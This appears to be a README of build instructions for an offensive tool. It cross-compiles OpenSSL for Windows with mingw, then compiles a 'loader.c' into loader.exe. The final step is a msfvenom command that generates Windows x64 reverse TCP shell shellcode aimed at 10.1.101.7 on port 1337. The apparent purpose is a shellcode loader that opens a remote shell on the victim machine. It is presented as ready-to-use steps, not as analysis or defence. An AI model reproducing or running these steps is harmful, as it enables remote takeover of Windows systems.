# COMPILATION INSTRUCTIONS

## Install openssl windows
```bash
wget https://www.openssl.org/source/openssl-1.1.1v.tar.gz
gunzip openssl-1.1.1v.tar.gz
tar -xvf openssl-1.1.1v.tar
cd openssl-1.1.1v
./Configure mingw64 --cross-compile-prefix=x86_64-w64-mingw32- --prefix=/usr/local/openssl-windows
make
make install
```

## Compile on windows10
```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -I/usr/local/openssl-windows/include -L/usr/local/openssl-windows/lib -lcrypto -lssl -lws2_32
```

## Compile on windows11
```bash
x86_64-w64-mingw32-gcc loader.c -o loader.exe -I/usr/local/openssl-windows/include -L/usr/local/openssl-windows/lib -lcrypto -lssl -lws2_32 -static
```

## Generate shellcode
```
msfvenom -p windows/x64/shell_reverse_tcp LPORT=1337 LHOST=10.1.101.7 -f hex
```
